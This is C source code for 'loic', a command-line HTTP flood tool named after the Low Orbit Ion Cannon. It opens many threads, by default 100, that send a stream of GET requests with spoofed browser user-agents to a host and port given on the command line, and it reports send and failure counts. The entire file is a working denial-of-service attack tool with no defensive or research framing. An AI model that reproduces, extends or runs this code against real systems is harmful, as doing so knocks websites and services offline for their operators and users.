#include <stdio.h>
#include <getopt.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>

struct addrinfo *info;

struct timespec gtime;

volatile unsigned long long send_count;
volatile unsigned long long recv_count;
volatile unsigned long long restart_count;

void setupinfo(char* host, char* port) {
	struct addrinfo hints;

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;

	//getaddrinfo(host, "80", &hints, &info);
	getaddrinfo(host, port, &hints, &info);
}

struct message {
	char* m;
	int len;
};

struct message messages[100];

void setup_messages() {
	int i;

	char* lang[6] = {"en-GB","en-US","es-ES","pt-BR","pt-PT","sv-SE"};
	char* versions[3] = {"5.1","6.0","6.1"};

	for(i = 0; i < 100; ++i) {
		char* m = malloc(500 * sizeof(char));
		int l;

		l = sprintf(m, "GET / HTTP/1.1\r\nHost: www.google.com\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT %s; %s; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17\r\nAccept: */*\r\n\r\n", lang[rand() % 6], versions[rand() % 3]);

		messages[i].m = m;
		messages[i].len = l;
	}
}

void* loop(void* data) {
	char* b = (char*)data;
	
	struct timespec mytime;

	int sock = socket(info->ai_family, info->ai_socktype, info->ai_protocol);
	fcntl(sock, F_SETFL, O_NONBLOCK);
#ifdef SO_NOSIGPIPE
	int set = 1;
	setsockopt(sock, SOL_SOCKET, SO_NOSIGPIPE, (void *)&set, sizeof(int));
#endif
	connect(sock, info->ai_addr, info->ai_addrlen);

	int m;

	char* buffer = malloc(1000 * sizeof(char));
	int status;

	while(*b) {
		m = rand() % 100;
#ifdef MSG_NOSIGNAL
		send(sock, messages[m].m, messages[m].len, MSG_NOSIGNAL);
#else
		send(sock, messages[m].m, messages[m].len, 0);
#endif
		while((status = recv(sock, buffer, 1000, 0)) > 0) { recv_count += status; }

		if(status == 0) {
			connect(sock, info->ai_addr, info->ai_addrlen);
			++restart_count;
		}

		++send_count;

		nanosleep(&gtime, &mytime);
	}
}

void usage() {
	printf("usage: loic [-h] [-r rate] [-t threads] [-p portNo] host\n");
}

int main(int argc, char **argv)
{
	int num_threads = 100;
	int rate = 1000;
	char *port = "80";
	
	struct option long_options[] = {
		{"port",    required_argument, 0, 'p'},
		{"threads", required_argument, 0, 't'},
		{"rate",    required_argument, 0, 'r'},
		{"help",    no_argument,       0, 'h'},
		{0,         0,                 0, 0  }
	};

	int c;
	int option_index = 0;

	while((c = getopt_long(argc, argv, "ht:r:p:", long_options, &option_index)) != -1) {
		switch(c) {
			case 'p':
				port = (optarg);
				break;
			case 't':
				num_threads = atoi(optarg);
				break;
			case 'r':
				rate = atoi(optarg);
				break;
			case 'h':
				printf("loic: low orbit ion cannon\n");
				usage();
				printf("  -r, --rate:    modify requests per second\n"
				       "                 default: 1000\n"
				       "  -t, --threads: modify the number of threads\n"
				       "                 default: 100\n"
				       "  -p, --port: port number on target\n"
				       "                 default: 80\n");
				return 0;
			default:
				usage();
				return -1;
		}
	}

	if(optind == argc) {
		printf("error: a host must be supplied\n");
		usage();
		return -1;
	}

	pthread_t threads[num_threads];

	char done = 1;

	int i;

	long long nsec_rate = 1000000000LL * num_threads / rate;

	gtime.tv_sec = nsec_rate / 1000000000LL;
	gtime.tv_nsec = nsec_rate % 1000000000LL;

	setup_messages();

	setupinfo(argv[optind],port);

	for(i=0; i<num_threads; ++i) {
		pthread_create(&threads[i], NULL, loop, &done);
	}

	for(;;) {
		send_count = 0;
		recv_count = 0;
		restart_count = 0;
		sleep(1);
		printf("sent: %8llu recvd: %10llu failed: %8llu\n", send_count, recv_count, restart_count);
	}

	done = 0;

	return 0;
}